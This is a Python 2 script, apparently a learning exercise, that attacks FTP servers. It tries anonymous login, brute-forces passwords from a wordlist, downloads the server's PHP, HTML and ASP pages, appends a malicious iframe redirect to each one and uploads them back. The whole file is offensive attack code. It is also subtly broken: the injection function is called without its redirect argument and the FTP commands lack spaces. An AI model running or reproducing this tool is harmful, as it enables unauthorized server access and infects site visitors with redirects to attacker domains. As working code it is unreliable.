# -*- coding: utf-8 -*-
"""
Created on Sun Aug 12 13:43:36 2018

@author: bharg
"""

import ftplib
import optparse

def anon_login(hostname):
    try:
       ftp=ftplib.FTP(hostname)
       ftp.login("anonymous","watha@your.com")
       print "Anonymous login succeeded"
       ftp.quit()
       return True
    except:
       print "Anonymous login failed"
       return False
    

def brute_force(ftp,username,passfile):
    f=open(passfile,"r")
    for lines in f.readlines():
        sample_pass=lines.strip("\n")
        try:
            ftp.login(username,sample_pass)
            print " The brute force attack suceeded with username %s and password%s"%(username,sample_pass)
            ftp.quit()
            return username,sample_pass
        except:
            pass
    print " No credentials found"
    return (None,None)
def pages(ftp):
   contents=[]
   try:
       dirlist=ftp.nlst()
   except:
       print "No files found on the server"
       return
   for name in dirlist:
       fname=name.lower()
       if ".php" in fname or ".html" in fname or ".asp" in fname:
           contents.append(name)
   return contents

def inject(contents,ftp,redirect):
    for page in contents:
        f=open(page+'.tmp','w')
        #retrieves the content from the file and stores in the temporary file
        #downloading the file
        ftp.retrlines("RETR"+page,f.write)
        print " Downloading the page %s"%page
        f.write(redirect)
        f.close()
        print " Successfully injected the malicious iframe on the page %s" %page
        #uploading the malicious file
        ftp.storlines("STOR"+page,open(page+".tmp"))
        print "Successfully uploaded the malicious page back on the server"


def attack(hostname,username,passfile,redirect):
     boolean=anon_login(hostname)
     ftp=ftplib.FTP(hostname)
     if boolean:
         ftp.login("anonymous","watha@your.com")
         contents=pages(ftp)
         inject(contents,ftp)
     else:
         suser,spass=brute_force(ftp,username,passfile)
         ftp.login(suser,spass)
         contents=pages(ftp)
         inject(contents,ftp)

def main():
    parser=optparse.OptionParser("Usage: -H <HostName> -U <username> -P <passfile> -R <Redirecting domain>")
    parser.add_option("-H",dest="hostname",type="string",help="Provide the FTP server host on which you want to perform this attack")
    parser.add_option("-U",dest="username",type="string",help="Provide the username for the host")
    parser.add_option("-P", dest="passfile",type="string",help="Provide the passfile on which you want bruteforce")
    parser.add_option("-R", dest="redirect",type="string",help="Provide the redirect domain value")
    (options,args)=parser.parse_args()
    if options.hostname==None or options.username==None or options.passfile==None or options.redirect==None:
        print parser.usage
    hostname=options.hostname
    username=options.username
    passfile=options.passfile
    redirect=options.redirect
    attack(hostname,username,passfile,redirect)
    


if __name__=="__main__":
    main()